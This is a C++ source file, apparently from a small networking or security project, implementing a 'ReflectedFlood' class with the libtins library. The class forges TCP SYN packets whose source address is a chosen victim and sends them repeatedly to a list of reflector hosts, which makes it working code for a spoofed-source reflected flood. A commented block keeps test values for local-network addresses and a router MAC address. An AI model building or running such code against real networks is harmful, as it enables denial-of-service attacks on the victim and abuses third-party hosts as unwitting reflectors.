#include "ReflectedFlood.hh"

using namespace Tins;

ReflectedFlood::ReflectedFlood(const std::string &target) : _target(target)
{
}

void ReflectedFlood::addSpoof(const std::string &spoofedAdress, unsigned int port)
{
    _spoofList.push_back(Spoof(IPv4Address(spoofedAdress), port));
}

void ReflectedFlood::dumpAdress(void)
{
    std::cout << "Send from :" << std::endl;
    for (unsigned int i = 0; i < _spoofList.size(); i++)
        std::cout << _spoofList[i].first << ":" << _spoofList[i].second << std::endl;
}

void ReflectedFlood::flood(unsigned int count)
{
    NetworkInterface    iface = NetworkInterface::default_interface();
    NetworkInterface::Info  info = iface.addresses();
    std::vector<EthernetII>     packets;
    PacketSender        sender;
    EthernetII          eth = EthernetII("9c:97:26:e2:82:d6", info.hw_addr); //"ac:81:12:ba:55:bb");
    IP                  ip;
    TCP                 tcp;

    tcp.set_flag(TCP::SYN, 1);
    tcp.sport(54254);
    ip.src_addr(_target);

    // Create packet list with spoofed ip
    for (Spoof spoof : _spoofList)
    {
        ip.dst_addr(spoof.first);
        tcp.dport(spoof.second);
        packets.push_back(eth / ip / tcp);
    }

    std::cout << "Sending packets .." << std::endl;
    // Send each packets
    for (unsigned int i = 0; i < count; i++)
    {
        for (EthernetII packet : packets)
        {
            std::cout << packet.src_addr() << " -> " << packet.dst_addr() << std::endl;
            sender.send(packet, iface);
            sleep(1);
        }
    }

    std::cout << "done." << std::endl;
}

/*
    NetworkInterface        iface = NetworkInterface::default_interface();
    NetworkInterface::Info  info = iface.addresses();
    IPv4Address             ipBox("192.168.1.254");
    IPv4Address             ipEnzo("192.168.1.67");
    std::string             macBox("9c:97:26:e2:82:d6");

    EthernetII              eth = EthernetII(macBox, info.hw_addr) / IP(ipBox, info.ip_addr);
    TCP     tcp(80, 3321);

    tcp.set_flag(TCP::SYN, 1);
    eth /= tcp;
 */
